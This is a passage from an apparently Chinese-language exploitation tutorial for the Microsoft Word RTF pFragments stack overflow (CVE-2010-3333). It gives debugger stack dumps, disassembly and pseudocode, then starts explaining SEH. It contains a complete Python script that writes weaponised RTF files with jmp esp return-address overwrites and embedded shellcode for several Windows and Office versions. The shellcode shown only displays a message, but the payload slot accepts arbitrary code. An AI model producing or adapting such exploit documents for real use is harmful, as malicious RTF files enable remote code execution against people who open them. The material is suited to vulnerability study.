mso.30F0B5FB</span><br><span class="line">                                    001237C0   01C40824</span><br><span class="line">                                    001237C4   001237DC</span><br><span class="line">                                    001237C8   <span class="number">00000000</span></span><br><span class="line">                                    001237CC   <span class="number">00000000</span></span><br><span class="line">                                    001237D0   <span class="number">00000000</span></span><br><span class="line">                                    001237D4   <span class="number">00000000</span></span><br><span class="line">                                    001237D8   0000FF35</span><br><span class="line">                                    001237DC   FFFF0000 &lt;-pFragments缓冲区起始地址</span><br><span class="line">                                    001237E0   <span class="number">05000000</span></span><br><span class="line">                                    001237E4   <span class="number">00000000</span></span><br><span class="line">                                    001237E8   0000FFFF</span><br><span class="line">                                    001237EC   0012381C &lt;-<span class="built_in">ebp</span></span><br><span class="line">                                    001237F0   30F0B56B  返回到 mso.30F0B56B 来自 mso.30F0B5C2</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<code>pFragments缓冲区</code>起始地址距保存函数<code>sub_30F0B5C2的返回地址</code>的栈地址的偏移为<code>0x14字节</code>，所以在<code>pFragments属性值</code>中的<code>复制长度</code>之后再填充<code>0x14字节</code>数据，即可覆盖到<code>返回地址</code>。我们这里使用<code>“jmp esp”</code>指令的地址覆盖其<code>返回地址</code>。由于函数<code>sub_30F0B5C2</code>在返回时，会<code>弹出0x14字节</code>的栈空间，所以，返回地址之后不能直接放置<code>Shellcode</code>，需要填充<code>0x14</code>字节的<code>垃圾数据</code>，然后再放置<code>Shellcode</code>。这样，执行<code>“jmp esp”</code>指令的时候，就可以直接跳转到<code>Shellcode</code>执行了。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>30F0B6B8 loc_30F0B6B8:                           <span class="comment">; CODE XREF: sub_30F0B5C2+184C37↓j</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B6B8         <span class="keyword">pop</span>     <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B6B9         <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B6BA         <span class="keyword">retn</span>    <span class="number">14h</span> &lt;----</span><br><span class="line"><span class="symbol">.text:</span>30F0B6BA sub_30F0B5C2 endp</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;在写<code>Exp</code>的过程中，遇到一个问题。由于复制数据指令<code>“30ED442C rep movsd”</code>的位置距离函数<code>sub_30F0B5C2</code>的返回指令<code>&quot;30F0B6BA retn 14h&quot;</code>还有很多指令需要执行，但是<code>栈</code>已经<code>被破坏</code>了，所以可能会造成这些指令<code>执行异常</code>，我们需要构造<code>关键的数据</code>，使其可以成功执行到函数<code>sub_30F0B5C2</code>的返回指令<code>&quot;30F0B6BA retn 14h&quot;</code>。这些指令会访问调用函数<code>sub_30F0B5C2</code>时，压入栈的<code>参数</code>，也就是我们覆盖的函数<code>sub_30F0B5C2</code>的<code>返回地址</code>之后的<code>0x14字节</code>栈空间。如果我们全用<code>“a”</code>覆盖这片栈空间，就会<code>造成异常</code>，异常信息如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">*************************************************************************************************</span><br><span class="line"></span><br><span class="line">    所属模块: mso.dll</span><br><span class="line">    char __userpurge sub_30F0B5C2@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">eax</span>&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">*************************************************************************************************</span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>30F0B5F8         <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">1Ch</span>]              <span class="comment">;   sub_30ED4406</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5FB         <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_C]                 <span class="comment">;   eax = [ebp+0x14] = 0x001237ec+0x14] = [0x00123800] = 0xAAAAAAAA(a4)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B5FE         <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_10]                     <span class="comment">; arg3: [ebp+0x18] = 0x001237ec+0x18] = [0x00123804] = 0xAAAAAAAA(a5)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B601         <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+var_10]                <span class="comment">;   edx = [ebp-0x10] = [0x001237ec-0x10] = [0x001237dc] = 0xAAAAAAAA(pFragements属性值起始内容) &lt;----</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B604         <span class="keyword">neg</span>     <span class="built_in">eax</span>                              <span class="comment">;   求补:按位取反再加一,eax = 0x55555556</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B606         <span class="keyword">sbb</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = eax-eax-CF = 0xFFFFFFFF,CF=1</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B608         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_8]                 <span class="comment">;   ecx = ebp-0x8 = 0x001237ec-0x8 = 0x001237e4</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B60B         <span class="keyword">and</span>     <span class="built_in">eax</span>, <span class="built_in">ecx</span>                         <span class="comment">;   eax = eax&amp;ecx = 0x001237e4</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B60D         <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x001237e4</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B60E         <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_0]                      <span class="comment">; arg1: [ebp+0x8] = [0x001237ec+0x8] = [0x001237f4] = 0xAAAAAAAA(a1)</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B611         <span class="keyword">call</span>    sub_30F0B7AF                     <span class="comment">; </span></span><br><span class="line"><span class="symbol">.text:</span>30F0B616         <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>30F0B618         <span class="keyword">jz</span>      loc_30F0B6B6</span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    **********************************************************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        char __userpurge sub_30F0B7AF@&lt;<span class="built_in">al</span>&gt;(<span class="keyword">int</span> a1@&lt;<span class="built_in">edx</span>&gt;, <span class="keyword">int</span> a2@&lt;<span class="built_in">edi</span>&gt;, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span><br><span class="line"></span><br><span class="line">    **********************************************************************************************</span><br><span class="line"><span class="symbol">    .text:</span>30F0B7AF         <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x001237EC</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B0         <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                         <span class="comment">;   ebp = esp = 0x001237B8</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B2         <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">10h</span>                         <span class="comment">;   esp = esp-0x10 = 0x001237B8-0x10 = 0x001237A8</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B5         <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">;   ebx = 0x05000000</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B6         <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span>                         <span class="comment">;   ebx = ebx^ebx = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7B8         <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_8], <span class="built_in">ebx</span>                 <span class="comment">;   [ebp+0x10] = [0x001237B8+0x10] = [0x001237C8] = 0xAAAAAAAA(a3)</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7BB         <span class="keyword">jz</span>      loc_310901D0                     <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C1         <span class="keyword">cmp</span>     <span class="built_in">edx</span>, <span class="built_in">ebx</span>                         <span class="comment">; arg2: edx = 0xAAAAAAAA,ebx = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C3         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+lpMem], <span class="built_in">ebx</span>                 <span class="comment">;   [ebp-0xC] = [0x001237B8-0xC] = [0x001237AC] = ebx = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C6         <span class="keyword">jz</span>      short loc_30F0B7D8               <span class="comment">;   为0跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7C8         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+lpMem]                 <span class="comment">; arg1: ecx = ebp-0xc = 0x001237B8-0xC = 0x001237AC</span></span><br><span class="line"><span class="symbol">    .text:</span>30F0B7CB         <span class="keyword">call</span>    sub_30F0B90A                     <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        **************************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: mso.dll</span><br><span class="line">            signed <span class="keyword">int</span> __fastcall sub_30F0B90A(LPVOID *a1, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">        **************************************************************</span><br><span class="line"><span class="symbol">        .text:</span>30F0B90A sub_30F0B90A proc <span class="built_in">near</span>                </span><br><span class="line"><span class="symbol">        .text:</span>30F0B90A                                        </span><br><span class="line"><span class="symbol">        .text:</span>30F0B90A         <span class="keyword">lea</span>     <span class="built_in">eax</span>, (loc_30F0B914+<span class="number">4</span>)[<span class="built_in">edx</span>*<span class="number">8</span>]     <span class="comment">; eax = edx*8+0x30F0B914+4 = 0xAAAAAAAA*8+0x30F0B918 = 0x86460E68(a2,edx) &lt;----</span></span><br><span class="line"><span class="symbol">        .text:</span>30F0B911         <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">eax</span>+<span class="number">4</span>]                     <span class="comment">; edx = [eax+4] = [0x86460E68+4] = [0x86460E6C] = ??? &lt;----</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;由于<code>pFragements属性值</code>起始的<code>第1个dword</code>会被传进调用<code>CrashFun(sub_30ED4406)</code>函数的指令之后调用的<code>sub_30F0B7AF函数</code>，作为其<code>参数</code>，后面的程序会利用其生成一个<code>不可访问的地址</code>，造成<code>内存访问异常</code>。</p><p>&emsp;&emsp;经过对函数<code>sub_30F0B5C2</code>和函数<code>sub_30F0B7AF</code>的伪代码进行分析，结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __userpurge sub_30F0B5C2@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( a6 ) <span class="comment">// 进入sub_30F0B5C2函数时,a6 != 0x0</span></span><br><span class="line">    &#123;</span><br><span class="line">        v7 = *(<span class="keyword">int</span> **)(sub_30D29EA3(*(_BYTE **)(a1 + <span class="number">8</span>)) + <span class="number">100</span>);</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        v8 = *v7;</span><br><span class="line">        v16 = <span class="number">83886080</span>;</span><br><span class="line">        (*(<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span> *, <span class="keyword">int</span> *, <span class="keyword">int</span>))(v8 + <span class="number">28</span>))(v7, &amp;v15, a3); <span class="comment">// sub_30ED4406,a6可被修改为0x0</span></span><br><span class="line">        <span class="comment">// a6 == 0x0,会使sub_30F0B7AF()函数返回0,a6为sub_30F0B5C2()在栈上的第5个参数</span></span><br><span class="line">        <span class="comment">// 并且可以使sub_30F0B5C2()函数直接返回</span></span><br><span class="line">        result = sub_30F0B7AF(a2, a5 != <span class="number">0</span> ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v17 : <span class="number">0</span>, a6); </span><br><span class="line">        <span class="keyword">if</span> ( result ) <span class="comment">// result == 0x0,sub_30F0B5C2()函数直接返回</span></span><br><span class="line">        &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_3144D83D();</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> __userpurge sub_30F0B7AF@&lt;al&gt;(<span class="keyword">int</span> a1@&lt;edx&gt;, <span class="keyword">int</span> a2@&lt;edi&gt;, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> ( !a5 ) <span class="comment">// a5 == 0x0,则直接返回,且返回值为0</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_3144D83D();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;所以我们只要让函数<code>sub_30F0B5C2</code>在<code>栈</code>上的<code>第5个参数</code>被修改为<code>0x0</code>,则可以让函数<code>sub_30F0B5C2</code>跳过执行完<code>CrashFun(sub_30ED4406)</code>函数之后可能需要执行的代码部分，<code>直接返回</code>。</p><p><strong><code>环境：</code></strong>Windows7 &amp; Office2007</p><p>&emsp;&emsp;在<code>Win7&amp;Office2007</code>的环境下，和<code>XP&amp;Office2003</code>环境下，基本是一样的，只是<code>关键函数</code>的地址不一样。<code>对应关系</code>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+--------------------+-------------------+</span><br><span class="line">|   XP&amp;Office2003     |   sub_30F0B5C2     |   sub_30F0B7AF    |</span><br><span class="line">|---------------------|--------------------|-------------------|</span><br><span class="line">|   Win7&amp;Office2007   |   sub_32E5955E     |   sub_32E5941B    |</span><br><span class="line">+---------------------+--------------------+-------------------+</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;还有就是所使用的<code>ROPGadgets</code>的地址不一样，也有可能<code>ROPGadgets</code>的地址是相同的，这种比较少。</p><p><strong><code>Exp:</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: Sp4n9x</span></span><br><span class="line"><span class="comment"># Name: MS10-087 Microsoft Word RTF pFragments Stack Buffer Overflow(CVE-2010-3333)</span></span><br><span class="line"><span class="comment"># Environment1: Windows XP SP3 &amp; Microsoft Office 2003 SP3(11.8169.8172)</span></span><br><span class="line"><span class="comment"># Environment2: Windows 7 x86 SP0 &amp; Microsoft Office 2007 SP0(12.0.4518.1014)</span></span><br><span class="line"><span class="comment"># Exploit Technology: ret2shellcode</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_array_paramter</span><span class="params">()</span>:</span></span><br><span class="line">    bad_sizes = (<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>)</span><br><span class="line">    num = random.randint(<span class="number">0</span>,<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">while</span> num <span class="keyword">in</span> bad_sizes:</span><br><span class="line">        num = random.randint(<span class="number">0</span>,<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(env)</span>:</span></span><br><span class="line">    el_size = generate_array_paramter() <span class="comment"># Array element size</span></span><br><span class="line">    el_count = generate_array_paramter() <span class="comment"># Array element count</span></span><br><span class="line"></span><br><span class="line">    str1 = struct.pack(<span class="string">'&lt;H'</span>,<span class="number">0x1111</span>)</span><br><span class="line">    str1 = binascii.b2a_hex(str1)</span><br><span class="line">    str2 = struct.pack(<span class="string">'&lt;H'</span>,<span class="number">0x2222</span>)</span><br><span class="line">    str2 = binascii.b2a_hex(str2)</span><br><span class="line">    data = str1 + str2</span><br><span class="line">    </span><br><span class="line">    length = struct.pack(<span class="string">'&lt;H'</span>,<span class="number">0x0130</span>) <span class="comment"># the data length after this</span></span><br><span class="line">    length =  binascii.b2a_hex(length) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> env == <span class="number">0</span>:</span><br><span class="line">        jmp_esp = struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x7dc54e64</span>) <span class="comment"># shell32.dll(version: 6.0.2900.6242),PAGE_READONLY(OllyFindAddr)</span></span><br><span class="line">        jmp_esp = binascii.b2a_hex(jmp_esp)</span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">1</span>:</span><br><span class="line">        jmp_esp = struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x788281cb</span>) <span class="comment"># msxml5.dll(version: 5.20.1072.0),ASLR Disable,PAGE_EXECUTE_READ(OllyFindAddr,mona)</span></span><br><span class="line">        jmp_esp = binascii.b2a_hex(jmp_esp)</span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">2</span>:</span><br><span class="line">        jmp_esp = struct.pack(<span class="string">'&lt;I'</span>,<span class="number">0x7ffa4512</span>) <span class="comment"># no module,universal,PAGE_READONLY(OllyFindAddr)</span></span><br><span class="line">        jmp_esp = binascii.b2a_hex(jmp_esp)</span><br><span class="line"></span><br><span class="line">    shellcode = (<span class="string">"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"</span></span><br><span class="line">                 <span class="string">"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"</span></span><br><span class="line">                 <span class="string">"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"</span></span><br><span class="line">                 <span class="string">"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"</span></span><br><span class="line">                 <span class="string">"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"</span></span><br><span class="line">                 <span class="string">"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x6e\x39"</span></span><br><span class="line">                 <span class="string">"\x78\x01\x68\x40\x53\x70\x34\x89\xe1\xfe\x49\x07\x31\xc0\x51"</span></span><br><span class="line">                 <span class="string">"\x50\xff\xd7"</span>) <span class="comment"># FatalAppExitA(uAction=0,lpMessageText="@Sp4n9x\x01")</span></span><br><span class="line">    shellcode = binascii.b2a_hex(shellcode)</span><br><span class="line"></span><br><span class="line">    pFragments_value = <span class="string">"%d;%d;"</span> % (el_size,el_count)</span><br><span class="line">    pFragments_value += data</span><br><span class="line">    pFragments_value += length</span><br><span class="line">    pFragments_value += <span class="string">'a'</span>*<span class="number">0x14</span>*<span class="number">2</span></span><br><span class="line">    pFragments_value += jmp_esp</span><br><span class="line">    pFragments_value += <span class="string">'a'</span>*<span class="number">0x10</span>*<span class="number">2</span></span><br><span class="line">    <span class="comment"># The fifth parameter of sub_30F0B5C2(Office2003)/sub_32E5955E(Office2007) on the stack</span></span><br><span class="line">    pFragments_value += <span class="string">'0'</span>*<span class="number">8</span> <span class="comment"># make "30F0B7B8 cmp [ebp+arg_8], ebx" equal(Office2003).</span></span><br><span class="line">    pFragments_value += shellcode</span><br><span class="line"></span><br><span class="line">    content = <span class="string">r"&#123;\rtf1"</span></span><br><span class="line">    content += <span class="string">r"&#123;\shp"</span></span><br><span class="line">    content += <span class="string">r"&#123;\sp"</span></span><br><span class="line">    content += <span class="string">r"&#123;\sn pfragments&#125;"</span></span><br><span class="line">    content += <span class="string">r"&#123;\sv %s"</span> % pFragments_value</span><br><span class="line">    content += <span class="string">r"&#125;&#125;&#125;&#125;"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> len(content)</span><br><span class="line">    <span class="keyword">if</span> env == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CVE-2010-3333-ret2shellcode(XP_Office2003).rtf'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CVE-2010-3333-ret2shellcode(Win7_Office2007).rtf'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)        </span><br><span class="line">    <span class="keyword">elif</span> env == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'CVE-2010-3333-ret2shellcode-universal.rtf'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 0:XP&amp;Office2003</span></span><br><span class="line">    <span class="comment"># 1:Win7&amp;Office2007</span></span><br><span class="line">    <span class="comment"># 2:universal</span></span><br><span class="line">    env = <span class="number">2</span></span><br><span class="line">    exploit(env)</span><br></pre></td></tr></table></figure></p><h3 id="0x42-方法二：覆盖SEH记录"><a href="#0x42-方法二：覆盖SEH记录" class="headerlink" title="0x42 方法二：覆盖SEH记录"></a>0x42 方法二：覆盖SEH记录</h3><h4 id="1、用户态的异常处理过程"><a href="#1、用户态的异常处理过程" class="headerlink" title="1、用户态的异常处理过程"></a>1、用户态的异常处理过程</h4><p>&emsp;&emsp;本程序产生的异常属于<code>用户态的异常</code>。</p><p><strong><code>用户态的异常处理过程:</code></strong></p><blockquote><ul><li>1、如果<code>发生异常</code>的程序正在<code>被调试</code>，那么将<code>异常信息</code>发送给正在调试它的<code>用户态调试器</code>，给调试器<code>第1次处理机会</code>；如果没有<code>被调试</code>，跳过本步。</li><li>2、如果<code>不存在</code>用户态调试器或调试器<code>未处理该异常</code>，那么在栈上放置<code>EXCEPTION_RECORD</code>和<code>CONTEXT</code>两个结构以及记录这两个结构位置的<code>EXCEPTION_POINTERS</code>结构，并将控制权返回给用户态<code>ntdll.dll</code>中的<code>KiUserExceptionDispatcher</code>函数，由它调用<code>ntdll!RtlDispatchException</code>函数进行<code>用户态的异常处理</code>。</li><li>3、如果<code>ntdll!RtlDispatchException</code>函数在调用用户态的异常处理过程中<code>未能处理该异常</code>，那么异常处理过程会再次返回<code>nt!KiDispatchException</code>，它将再次把<code>异常信息</code>发送给<code>用户态的调试器</code>，给调试器<code>第2次处理机会</code>。如果<code>没有</code>调试器存在，则<code>不会</code>进行第2次分发，而是直接<code>结束进程</code>。</li><li>4、如果第2次机会调试器<code>仍不处理</code>，<code>nt!KiDispatchException</code>会再次尝试把<code>异常</code>分发给<code>进程的异常端口</code>进行处理。该端口通常由<code>子系统进程csrss.exe</code>进行监听。子系统监听到该错误后，通常会显示一个<code>“应用程序错误”</code>对话框，用户可以单击<code>“确定”</code>按钮或者最后将其附加到调试器上的<code>“取消”</code>按钮。如果<code>没有调试器</code>能附加于其上，或者调试器还是<code>处理不了异常</code>，系统就调用<code>ExitProcess</code>函数来终结程序。</li><li>5、在<code>终结程序</code>之前，系统会再次调用<code>发生异常的线程</code>中的<code>所有异常处理过程</code>，这是线程异常处理过程所获得的<code>清理未释放资源</code>的最后机会，此后程序就终结了。</li></ul></blockquote><h4 id="2、SEH相关数据结构"><a href="#2、SEH相关数据结构" class="headerlink" title="2、SEH相关数据结构"></a>2、SEH相关数据结构</h4><h5 id="2-1、TIB结构"><a href="#2-1、TIB结构" class="headerlink" title="2.1、TIB结构"></a>2.1、TIB结构</h5><p>&emsp;&emsp;<code>TIB</code>(Thread Information Block,线程信息块)是保存<code>线程基本信息</code>的数据结构。在<code>用户模式</code>下，它位于<code>TEB</code>(Thread Environment Block,线程环境块)的<code>头部</code>，而<code>TEB</code>是操作系统为了保存<code>每个线程的私有数据</code>创建的，每个线程都有自己的TEB。在<code>Windows 2000 DDK</code>中(<code>winnt.h</code>)，TIB的定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">// 